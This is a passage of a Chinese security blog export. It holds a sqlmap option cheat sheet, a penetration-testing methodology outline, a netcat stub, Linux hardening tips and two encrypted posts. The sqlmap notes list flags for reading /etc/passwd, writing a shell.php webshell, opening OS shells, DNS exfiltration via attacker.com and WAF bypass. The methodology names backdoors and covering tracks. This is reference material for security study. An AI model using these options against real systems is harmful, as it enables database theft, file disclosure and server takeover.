class="comment">#长路，类型与原始值保持一致前提下，指定每次请求随机取值的参数名</span></span><br><span class="line">--scope <span class="string">"正则"</span> <span class="comment">#过滤日志内容</span></span><br><span class="line">--safe-url/--safe-freq <span class="string">"次数"</span> <span class="comment">#失败请求导致服务器销毁session,每发送--safe-freq此注入请求后，发送一次正常请求</span></span><br><span class="line">--skip-urlencode <span class="comment">#取消默认url编码</span></span><br><span class="line">--<span class="built_in">eval</span>=“import hashlib;<span class="built_in">hash</span>=hashlib.md5(id).hexdigest()<span class="string">" #每次请求执行前指定python代码</span></span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="sqlmap优化"><a href="#sqlmap优化" class="headerlink" title="sqlmap优化"></a>sqlmap优化</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--predict-output <span class="comment">#不断缩小范围，提高检测效率，与--threads参数不兼容</span></span><br><span class="line">--keep-alive <span class="comment">#使用https长连接，与proxy参数不兼容，避免重复建立连接</span></span><br><span class="line">--null-connection <span class="comment">#只获取相应页面大小值，不获取具体内容，通常高用于bool盲注</span></span><br><span class="line">--threads <span class="comment">#最大并发线程，默认1，最好不好超过10</span></span><br><span class="line">-o <span class="comment">#开启前三个，除--threads</span></span><br></pre></td></tr></table></figure><h2 id="获取混淆脚本"><a href="#获取混淆脚本" class="headerlink" title="获取混淆脚本"></a>获取混淆脚本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg -L sqlmap | grep tamper</span><br></pre></td></tr></table></figure><h2 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--level 1-5 <span class="comment">#默认1</span></span><br><span class="line">--risk 1-4 <span class="comment">#默认1 risk升高会造成数据被改风险</span></span><br><span class="line">--string,--not-string,--regexp,--code,--text-only,--titles <span class="comment">#页面比较，基于布尔的检测注入，人为指定标识真假的字符串</span></span><br></pre></td></tr></table></figure><h2 id="techniques"><a href="#techniques" class="headerlink" title="techniques"></a>techniques</h2><p>B: 布尔盲注<br>E: 基于报错的注入<br>U: 联合查询<br>S: 堆叠查询<br>T: 时间盲注</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--time-sec 5 <span class="comment">#默认5，基于时间的注入检测相应延迟时间</span></span><br><span class="line">--union-cols 6-9<span class="comment">#联合查询6-9列，随level增加</span></span><br><span class="line">--union-char <span class="comment">#默认使用NULL</span></span><br><span class="line">--dns-domain attacker.com <span class="comment">#攻击者控制了dns服务器，使用此功能可以提高dump数据速度</span></span><br><span class="line">--second-order http://1.1.1.1/b.php <span class="comment">#在一个界面注入，在1.1.1.1/b.php展示出来</span></span><br></pre></td></tr></table></figure><h2 id="enumeration"><a href="#enumeration" class="headerlink" title="enumeration"></a>enumeration</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">–current-user</span><br><span class="line"><span class="comment">#查询目标数据库管理系统的当前账号。</span></span><br><span class="line"></span><br><span class="line">–current-db</span><br><span class="line"><span class="comment">#查询数据库名称。（不是数据库管理系统）</span></span><br><span class="line"></span><br><span class="line">–hostname</span><br><span class="line"><span class="comment">#查询目标当前主机名。</span></span><br><span class="line"></span><br><span class="line">–users</span><br><span class="line"><span class="comment">#查询目标数据库管理系统所有的用户。</span></span><br><span class="line"></span><br><span class="line">–privileges -U username</span><br><span class="line"><span class="comment">#查看指定DBMS用户名的权限（-U后是用户名）。不指定用户查的就是所有账户的权限。</span></span><br><span class="line"></span><br><span class="line">–roles</span><br><span class="line"><span class="comment">#目标DBSM的角色。</span></span><br><span class="line"></span><br><span class="line">–dbs</span><br><span class="line"><span class="comment">#目标数据库管理系统当前账号有哪些数据库。这个常用</span></span><br><span class="line"></span><br><span class="line">–D：dvwa</span><br><span class="line"><span class="comment">#指定数据库。</span></span><br><span class="line"></span><br><span class="line">–tables</span><br><span class="line"><span class="comment">#查询有哪些表。常和-D连用。查询指定数据库所有的表。如下图返回</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意：查询–tables的时候不指定库的范围有时候会把系统层面表内容也查出来。</span></span><br><span class="line">-exclude-sysdbs <span class="comment">#：屏蔽系统库</span></span><br><span class="line"></span><br><span class="line">-T<span class="comment">#：指定表。</span></span><br><span class="line">–columns <span class="comment">#查询指定表有哪些列。例子： -D dvwa -T users --columns。如下图</span></span><br><span class="line"></span><br><span class="line">-C <span class="comment">#指定列</span></span><br><span class="line"><span class="comment">#例子：-D dvwa -T users -C user --columns</span></span><br><span class="line"></span><br><span class="line">–schema</span><br><span class="line"><span class="comment">#查询元数据。数据库表结构。</span></span><br><span class="line"></span><br><span class="line">–batch</span><br><span class="line"><span class="comment">#批处理。一切需要人工选择的地方全选择默认选项。这个重要</span></span><br><span class="line"></span><br><span class="line">–count</span><br><span class="line"><span class="comment">#统计某个表里面的看记录数据个数。</span></span><br><span class="line"></span><br><span class="line">–dump</span><br><span class="line"><span class="comment">#显示数据</span></span><br><span class="line">–dump -T 表 -D 数据库 --start 开始列 --stop 结束列</span><br><span class="line"></span><br><span class="line">–dump-all --exclude-sysdbs</span><br><span class="line"><span class="comment">#显示所有数据，排除系统数库据。</span></span><br><span class="line"></span><br><span class="line">–sql-query</span><br><span class="line"><span class="comment">#按照我们写的sql语句查询。</span></span><br><span class="line"><span class="comment">#格式：–sql-query “select * from users”</span></span><br></pre></td></tr></table></figure><h2 id="udf-injection"><a href="#udf-injection" class="headerlink" title="udf injection"></a>udf injection</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--udf-inject,--shared-lib</span><br><span class="line"><span class="comment">#编译共享库创建并上传至db server,以此生成udf实现高级注入</span></span><br></pre></td></tr></table></figure><h2 id="fileSystem"><a href="#fileSystem" class="headerlink" title="fileSystem"></a>fileSystem</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--file-read=<span class="string">"/etc/passwd"</span> <span class="comment">#读取/etc/passwd</span></span><br><span class="line">--file-write=<span class="string">"shell.php"</span> --file-dest <span class="string">"/tmp/shell.php"</span> <span class="comment">#写入shell</span></span><br></pre></td></tr></table></figure><h2 id="os"><a href="#os" class="headerlink" title="os"></a>os</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--os-cmd</span><br><span class="line">--sql-shell</span><br><span class="line">--os-shell</span><br></pre></td></tr></table></figure><h2 id="windows-registory"><a href="#windows-registory" class="headerlink" title="windows registory"></a>windows registory</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--reg-read</span><br><span class="line">--reg-add</span><br><span class="line">--reg-del</span><br><span class="line">--reg-key,--reg-value,--reg-data,--reg-type</span><br></pre></td></tr></table></figure><h2 id="general"><a href="#general" class="headerlink" title="general"></a>general</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-s <span class="comment">#sqlite会话文件保存位置</span></span><br><span class="line">-t <span class="comment">#记录流量文件保存位置</span></span><br><span class="line">--charset=GBK <span class="comment">#强制字符编码为gbk</span></span><br><span class="line">--crawl <span class="comment">#深度</span></span><br><span class="line">--batch --crawl=3</span><br><span class="line">--csv-del <span class="comment">#指定分隔符</span></span><br><span class="line">--dbms-cred <span class="comment">#指定数据库账号</span></span><br><span class="line">--flush-session <span class="comment">#清空session</span></span><br><span class="line">--force-ssl <span class="comment">#强制http</span></span><br><span class="line">--fresh-queries <span class="comment">#忽略session查询结果</span></span><br><span class="line">--hex -v 3 <span class="comment">#dump非ascii，将其编码为16进制</span></span><br><span class="line">--output-dir=/tmp <span class="comment">#输出目录为tmp</span></span><br><span class="line">--parse-errors <span class="comment">#分析內建报错信息</span></span><br><span class="line">--save <span class="comment">#命令保存成配置文件</span></span><br><span class="line">-z bat <span class="comment">#助记batch</span></span><br></pre></td></tr></table></figure><h2 id="miscellaneous"><a href="#miscellaneous" class="headerlink" title="miscellaneous"></a>miscellaneous</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--answer</span><br><span class="line">--check-waf <span class="comment">#检测waf/ips/ids</span></span><br><span class="line">--hpp <span class="comment">#绕过waf/ips/ids</span></span><br><span class="line">--identify-waf <span class="comment">#判别waf</span></span><br><span class="line">--mobile <span class="comment">#模拟收集</span></span><br><span class="line">--purge-output <span class="comment">#清除output文件夹</span></span><br><span class="line">--smart <span class="comment">#只选择基于错误的检测</span></span><br><span class="line">--wizard</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/posts/312e3d12/</url>
    <content><![CDATA[<h1 id="信息收集-dns"><a href="#信息收集-dns" class="headerlink" title="信息收集-dns"></a>信息收集-dns</h1><p><del>~</del></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>netcat使用手册</title>
    <url>/posts/6cd8ef13/</url>
    <content><![CDATA[<h1 id="netcat使用手册"><a href="#netcat使用手册" class="headerlink" title="netcat使用手册"></a>netcat使用手册</h1><h2 id="client"><a href="#client" class="headerlink" title="client"></a>client</h2><h3 id="查看baner-以及连接-端口探测"><a href="#查看baner-以及连接-端口探测" class="headerlink" title="查看baner,以及连接,端口探测"></a>查看baner,以及连接,端口探测</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -vn ip port</span><br></pre></td></tr></table></figure><h3><a href="#" class="headerlink"></a></h3><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <tags>
        <tag>netcat， usage</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试标准</title>
    <url>/posts/bb4e3e2e/</url>
    <content><![CDATA[<h1 id="渗透测试标准"><a href="#渗透测试标准" class="headerlink" title="渗透测试标准"></a>渗透测试标准</h1><ol><li>前期沟通</li><li>信息收集</li><li>威胁建模</li><li>漏洞分析</li><li>渗透攻击</li><li>后渗透测</li><li>测试报告</li></ol><h2 id="前期沟通"><a href="#前期沟通" class="headerlink" title="前期沟通"></a>前期沟通</h2><p>与被渗透人员沟通地点，时间，金钱，要求等</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h3><ul><li>域名,邮箱,人员,地址</li><li>搜索引擎</li><li>metadata</li><li>专属密码字典</li></ul><h3 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h3><ul><li>扫描ip地址段</li><li>其他服务扫描</li><li>识别防护机制</li></ul><h2 id="威胁建模"><a href="#威胁建模" class="headerlink" title="威胁建模"></a>威胁建模</h2><ul><li><p>传统威胁建模方法<br>资产/攻击者</p></li><li><p>PETS标准威胁建模方法</p></li><li><ul><li>商业资产</li></ul></li><li><ul><li>商业流程</li></ul></li><li><ul><li>威胁主体</li></ul></li><li><ul><li>威胁能力</li></ul></li><li><ul><li>企业专有威胁模型</li></ul></li><li><p>动机建模</p></li><li><p>影响建模</p></li></ul><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ul><li>漏洞扫描</li><li>已知漏洞利用</li><li>web扫描</li><li>owasp zap</li></ul><h2 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h2><ul><li>未知漏洞挖掘</li><li>免杀编码绕过</li><li>wifi渗透</li><li>密码破解</li><li>社会工程</li></ul><h2 id="后渗透测试"><a href="#后渗透测试" class="headerlink" title="后渗透测试"></a>后渗透测试</h2><ul><li>内网渗透</li><li>本地提权</li><li>获取数据</li><li>擦出痕迹</li><li>留后门</li></ul><h2 id="测试报告"><a href="#测试报告" class="headerlink" title="测试报告"></a>测试报告</h2><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <tags>
        <tag>渗透测试， 标准</tag>
      </tags>
  </entry>
  <entry>
    <title>linux命令手册</title>
    <url>/posts/66162ca9/</url>
    <content><![CDATA[<h1 id="linux命令手册"><a href="#linux命令手册" class="headerlink" title="linux命令手册"></a>linux命令手册</h1><h2 id="查看末尾几行"><a href="#查看末尾几行" class="headerlink" title="查看末尾几行"></a>查看末尾几行</h2><p>tail -行数 文件名</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <tags>
        <tag>linux， 命令</tag>
      </tags>
  </entry>
  <entry>
    <title>linux运维</title>
    <url>/posts/17de06a/</url>
    <content><![CDATA[<h1 id="linux运维安全"><a href="#linux运维安全" class="headerlink" title="linux运维安全"></a>linux运维安全</h1><h2 id="系统安全"><a href="#系统安全" class="headerlink" title="系统安全"></a>系统安全</h2><h3 id="保持内核不更新"><a href="#保持内核不更新" class="headerlink" title="保持内核不更新"></a>保持内核不更新</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#保持包不更新</span></span><br><span class="line">sudo apt-mark hold 包名</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先查看linux-headers</span></span><br><span class="line">dpkg -l|grep linux-headers</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在查看linux-images</span></span><br><span class="line">dpkg -l|grep linux-image</span><br></pre></td></tr></table></figure><h3 id="关闭自动更新"><a href="#关闭自动更新" class="headerlink" title="关闭自动更新"></a>关闭自动更新</h3><p>修改配置文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/xdg/autostart/parrot-updater.desktop</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>文件内容如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env xdg-open</span></span><br><span class="line">[Desktop Entry]</span><br><span class="line">Name=System Updater</span><br><span class="line">Comment=Update reminder <span class="keyword">for</span> Parrot OS</span><br><span class="line">Icon=synaptic</span><br><span class="line">Exec=/usr/bin/update-reminder scheduled</span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=</span><br><span class="line">X-MATE-Autostart-enabled=<span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="用户安全"><a href="#用户安全" class="headerlink" title="用户安全"></a>用户安全</h2><h3 id="注释掉不需要的用户"><a href="#注释掉不需要的用户" class="headerlink" title="注释掉不需要的用户"></a>注释掉不需要的用户</h3><p>文件目录: /etc/passwd</p><p>建议先备份</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></span><br></pre></td></tr></table></figure><p>在不需要的用户前面加个#</p><h3 id="注释掉不需要的用户组"><a href="#注释掉不需要的用户组" class="headerlink" title="注释掉不需要的用户组"></a>注释掉不需要的用户组</h3><p>/etc/group</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sambashare:x:144:</span></span><br></pre></td></tr></table></figure><p>在不需要的用户组前面加个#</p><h2 id="账号安全"><a href="#账号安全" class="headerlink" title="账号安全"></a>账号安全</h2><h3 id="将非登录用户的shell设置为-sbin-nologin"><a href="#将非登录用户的shell设置为-sbin-nologin" class="headerlink" title="将非登录用户的shell设置为/sbin/nologin"></a>将非登录用户的shell设置为/sbin/nologin</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usermod -s /sbin/nologin 用户名</span><br></pre></td></tr></table></figure><h3 id="锁定一段时间内不使用用户"><a href="#锁定一段时间内不使用用户" class="headerlink" title="锁定一段时间内不使用用户"></a>锁定一段时间内不使用用户</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usermod -L 用户名</span><br></pre></td></tr></table></figure><h3 id="给用户文件加锁"><a href="#给用户文件加锁" class="headerlink" title="给用户文件加锁"></a>给用户文件加锁</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chattr +i /etc/passwd <span class="comment">#用户基本属性</span></span><br><span class="line">chattr +i /etc/shadow <span class="comment">#用户密码</span></span><br><span class="line">chattr +i /etc/group <span class="comment">#用户组属性</span></span><br><span class="line">chattr +i /etc/gshadow <span class="comment">#用户组密码</span></span><br></pre></td></tr></table></figure><h3 id="账号口令安全设置"><a href="#账号口令安全设置" class="headerlink" title="账号口令安全设置"></a>账号口令安全设置</h3><p>文件目录: /etc/login.defs</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/login.defs</span><br></pre></td></tr></table></figure><p>修改已存在账号的密码有效期</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chage -M 30 用户名 <span class="comment"># 修改已存在账号用户密码有效期</span></span><br><span class="line">chage -d 0 用户名 <span class="comment">#下次登录强制更改密码</span></span><br></pre></td></tr></table></figure><h3 id="命令历史限制"><a href="#命令历史限制" class="headerlink" title="命令历史限制"></a>命令历史限制</h3><p>文件目录: /etc/profile</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#增加一条环境变量</span></span><br><span class="line">HISTSIZE=50</span><br><span class="line"><span class="comment">#最多50条</span></span><br></pre></td></tr></table></figure><p>注销自动清空历史命令<br>文件目录: ~/.bash_logout</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">history</span> -c</span><br><span class="line">clear</span><br></pre></td></tr></table></figure><p>终端自动注销</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.bash_profile</span><br></pre></td></tr></table></figure><p>600s自动注销</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> TMOUT=600</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <tags>
        <tag>linux， 运维, 安全</tag>
      </tags>
  </entry>
  <entry>
    <title>masscan</title>
    <url>/posts/ef20d809/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。">
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="7c7bf118616740d4c23a3365f7b04c5b9fa9c68a67a0683871fe1d8b4ae419f4">07bfc7bbe5dfabe6b075268ffa8f19309e3b445d344d68a9b9c434d7058a230ad0509d7815b06856e636610a063b6186ec251d753961fb0f828928f648db7e4aef6788e0c8acf0273f02b64e49f5b49c99b8c381e7197c7b064b9430deb22602aafabcaa40825a4acf48e1e85fe10a250fcf8e773ac051060c3da3a9e9d487d9eb2a7a2957df115af23e95da497a16b2d6ebcac75c6af2a540a0b91fb99c125e4e910054d2ec5f6d1eb563367b0e1d933bd8082d5737473c88ce926cc8f7d54348a8272fb5275617f986899a45809cc8d334fd783e1098d4b3730b0dbe4bebee5a9943f979e54f96cc16418a60b41ba14f7acfda09f1803af0ba8758e94112186504f786f7f2dbbaa3fed34547f9c5ac7284069b876ca7f5c0a813d193a9aef3500ed5d0ceeab4af44d6eb574e9b51e78ebb25b88272344b0b450c7613faf28f57379a3d114729fde09b0540db691c068448fcc8b496f5056ee9e2bf82da9f9b509025db6e55e2f0d2ff07ca5aa4762157ef34de2ec5981662eb7b60e70cec0048760d79f421399f24d867fabf5d112b4444e0c461bb3aaf64a3d39e0433d4012678a556f55b546e71e90f47619f88cf9b37ee07b045fdc18d13e1101d4f2c82af40ac7586fc228499c7a9879f2b1f3b147b2186a7e5a0bb67faa093401cb582339404d95d01ea505903bd47f96a098c1f40ef3aa03fc5e168b18c6329b0cf650998dd0aa2b6d12b948212129cd8081c2ecd70d6dea4a7ca5719a8fafb81bcfb2bf07dfcac1170f36c8ec61e49b3c72523820f2d2a78c71ee230cd6e7941169218687417f1a8f00c2ec09163fdb6fb89b82fbe7aca380fe743014b7d507ba05355befd9e611e18f00654674261c7178e1977b2956270961c76d727dc3222a8d4a107f3b198bbe41ec1f196e8011f828aac3446afa76bf5096be32c1c16d4b6b3d9aea2e3d1bf66c164c37291997016da808fc39f114b6d0a80d504dad608b19ea28111d144793fad6cb77cf477dca92dedd6578be020b62256ec2ee5373ec19aa2328f6e86a444653efa8379444acb8cf92f15329f0ccc8d276878db74872895433f9b8cec43b23fcb1661496605c29472719d5616cd90a1585aadc1323939a7ccb8e60a996a0dfb69b2d3107490ab25238a22f36359dcd1b057cfcdd77d0c73e1182fa21b24b8c492a6f06dcbbfc7491c62e8200f7504abb606aa0c663074271ad4dacb38213923dc33be672c2c40dbb9a2ed8b00db7fc407d5e9fc809e45687308bf3d9f9828b633169ae9e7cc721b3a01b79de4cfbeb64cf0011900e3b7f8607411056678348397b906bc07feeaa316deb083e66df86ccde57e62b8da142d408ccee03b2476b1868f488a87ba9ecc2fbde49c0daaf306da9767c9cfe1424482c5d29fe6ec0843ccab71583951a04ca3b83fae4c45aa6b1acde1e3aefb25ebd6d1789be0ccc3b7ab2f3d657fab73d89c535f1e2a0ae806c2537ac6cba9d8502d76f0d368e044daf98bbe8043af07677703c5fe114185c1c2c7fef0df3d775c44de8e48dc9a2e61329c119db0b05e782c87b90bf3605c42fbc6d4ee783ec89165cdfe0196025fc317a098b668f61ffee1a1e9f5b1766125e42d59f65c204b5331b5bc454f246959a43bd1e443f27297b95a2ebe32524d221f16aa33a8e1ae1baeff58f1d238f9ebd178c3e120da56f01ca8f418e804e651caed30ea4b473509e7ba3b2e4b9c7eccf0f810d305d09f946d3fe809794c5f51558bba9a04f15060bb11b03c378322678f271931ae3a3d34a90d823b1e527b672fcb4f912e9330b66e2d708bb87b7816c2c0674a96ba42317debd934ddce1ff5507c14b98e542fa56285d538d9d3acf39c2954ee037efb5f18d6cce3d39dc5374dc09de826c21309999d4783fa4c5f9471a441bf7181942169f8699e9e20454ea33d07fa250b42d9c0e6f1bc2500524764474cdc862bd04bfb12df25c76c156a84009aab6d22e3c7ec396a06af708ac4e6ac0f941735acf56a51249ba8b154142f5819c954e5295b168df063a54538769d3f9780e5c377e60631c42e7a9fbf8a1fd37383a058c5837fd87797d5a6f2bbc0041f8dfcd52ea194d60e9c79d0e8bc0fe860ab7f705543405efb875a214aad8d26d3be86541ffed30c41758634c147161b7e52e43dcb7d0c7420d723fb224f5f52aa04ed6a27548f1f472fbb5a26fd7806d56b476f3bca321718b465eebfe8dc88d208f17a9686a88160e7bb7475fb08d27840c626490614ab90492f690c95679482f288c785d07f33b4086eae99e7211db2acf895b13506e0714076e0b58e85fc8503d0fd8b0bd2dcb0538fa6ac0edc1b20248f66036b4ff526b265ae9c76ac3d6bf34b98551043f2a1a951a51d2a89bd0180bc11a58fc7fea89f7c6e43cf17271f7dcc9f0335cdd32ea07702f95536f4e18619a6e7f8fd755b6e06b628e31cd997d42487cabe953fb579edb6b91f06bbab9a4c1965b8544272044dc2f151365b3bc8f1b21afffb4544cbdd4569dd478d9751c0fd1a171e1c727905a625fddf4098f3ac27dbfee2fbbf2c416b568e4c7ae07ca324202354444561b4ed11f2984e35a48fd4fb6d76bd7cf0c3f08d28ec4443a26d4455c3f07ce5c2679e74a80fb0da5a622a744906a329c80caf6db9c4462cfae48659a0fdb5084d1be58e319a94cfceb0dd36357615cf32713eb622760f2699e9eca07ea99c4736aabf54ab2bfe839145a478e7cffda3806298062f185d7ee46060e9da804f4b758140892cc00a30faf7374efca6612f3f192e304fbb01b08920279ed0a71bda4c2a91f0d9b7ca986a2a91f827eb022597dbe56d5d9a4233f254016ff39dc59b3bbcf3e1c5c6e8b7546bbe966ab4789ad737ae244560a3fbf50607bf2f8772c7ac7e7caba5d12f5a56ac314a5022166d3a143383ea73603a4ba572295a91ee2b8dd67cc7d563eb4ed3d7dc6cecfe19a8410b97a71dd73aa2d0c38db9ae4abee2ff6244422309c37bfcb6417587e028f01edaac1d6a77d65f26e441dcd9814a059590c4c1ad41e03360385e4bf5ab1665d526a72aece39a61061b52073900dae584774451fa714a2c2cd4623abbcce24b96a095268708d69256d88595c19c12997067205977fe1aecc524abf29cd26b94ed25778492b27751b821cfce5ec83e715669405d52fbab7f8208248ce23c554e1542ad487c3fd7e601626af3931b175f54e83e989b9e705b5c66810832259aa1c3e1b455170a16acb5d51ba119807cc442f9c9e45ba6a79635dcc0c0f3a6485d043a0a8c6dd84b7db077b00eb89051699b34f74ca5bc5e6d9cd987d155759d482cd7c048531edd2251033c42f68235a7e8dd30b2dc4397c47d4fabbd0a30d9c1559786b5dd9fc57c0c424b7ec3df580300af07462c658ab98130a47fc368e03d847b477b08ddd0cb6858daf01700b14260d3750230b26ef49803f58341465673777ed756bdf0f6d44fcc7a5b6bf42d92de1b3ceeff81cd3ded9130620b7003be8fd71ad3d7a5a301c9121a5989c45e6f30ab9e5ee9fdb86c326be7e11c4430181b633b480a44457417cba7d485e38ffae6d1f70eed1f561ebf8bcec412e3930a79313c3d06d63e8a1b91137084c92249f96c57c9d6c8b98e22dd2fa7a4c28beff769d8a0243a282adab7268c77ef4c77e3d5d102d62338fef5eebbd5269d618c03689d2893e4f4bf61f4c9455ad10f27da57fec6a40a09ea941cb07d71b2ec4e5d7c8fecde307862f633530270b3b07b5011acebbc7abe4e97f366a08372a906d580b2b8e320a1a8c63db6c759b09f09a79985342266d41b1dc46a603779ca5882f0d126f5c163268619df4fd28b8226240ade59214384dc4e6df7141ad81947d66e08d9c47f9025e0bcee37919e184a0caeb28e5aa049b361c1e2a740f6525121e7a1c85c240d9b9232a0f75e7bfd1e8fbfd0494025f965136e40304b04ad62e4198aec42ce6bb25f1d0e1604abf2a89fc0b7e28ad9406737bb30c463c010f67d6cb3ac12940980ab16bfb9392b781397749ce8d21dee2c7811c10a4697271eb7848133c70245d63c937c32f453f6661f809724d56b6f5aaabaa2dc9fe911985dad2b3dc16019c9177815f1b3a1a1ec6e7156f7b4705aea07c99f2d7de7be7deb835551d0489b6eccbbd0d92247145afb0286c010555cf0dddc228f6b</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>360比赛准备</title>
    <url>/posts/3add41f0/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。">
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="63eafdb5d8203fcc5bbced01ac235fd11934d0a8e3ac5787f28564f3ecc0d7b0">59ad8b9b334c2eba2d0830c890d3b39796559e2a0c56605d57e30840f960606f192cf7d5dc8cf7855cc68aed90876d29cdc678edf9816c02204dc9a175c1c9bcd788317640fd9d300a2f35426c198acff7da044a795c0519ab27b119a163bf848299bb4562ad923244a6b958d867324a49ab84f7b9fd54012095eeb4b5a59e09c54758f30650f59ebc0257f3426e847b43a3b6486196956877205d43371a2f5a973be5e04067efb15f202a2e8476ab2cacd4f97e956ae58810f8ff5ef7eec98571ff7a564e0124992ff93617e8fdcb984cad3bca7f7e0c7c5b70e6f2d8c5d9b05de376771078d5a5a43f6c2b616e424db3f9b3e3dc3f5d492d27545cc22b14fc95dc192a906d5590a0ed9cb635cad5a64f8a83ab51dc0508c6a849e9930f04c02ac499d115186deea95e0926b31eb14a4d1e515c46bc77e2a0285768cba69cf9b03e61b4c1922366e4c5a5cb56e319ba6d7cbca582f5e6dfe9315f6190a15393d98b0b9c8433ec98ffd92de3350e4d3965e8677b5e3a8019a23fdb074bbefe657770025b0e3a651e1cd1725ef0fed6bf32d6c844df93cae9e325b0eb8ca07b2f214918d0149697bfd90d3f19b816463865607f4721de732f60f13c1adea9c36111057fcdf4765f481f3bb248c47c77709acb470e3c9a124a9e66e9cc40adc9fcc32b5d586a74c829b0293da60d70722b3bb6bad8251fd18b3d7e70154ffdd9ce41abfc86b32d2acaf2bea60a6d4e3848e890550f00f9b16e75653a325b0fbbae488eac493417c48efd210c4a4bdcedecddcdded2c3b9a1cc4c6265b762df6e3151f5832b51b1ceae4e111f6568b48f7ddf15d9f3ab45e228e810573216651098d9d42cb0e61a624a924f0d0dfee7282f5ef72aafe5f8d2372d09bee8637dad9bf064d0596b12ebff7a08079a57aa09e56e97e191a68eee864e30298529b47e5ff427f9e74adc94eea750b9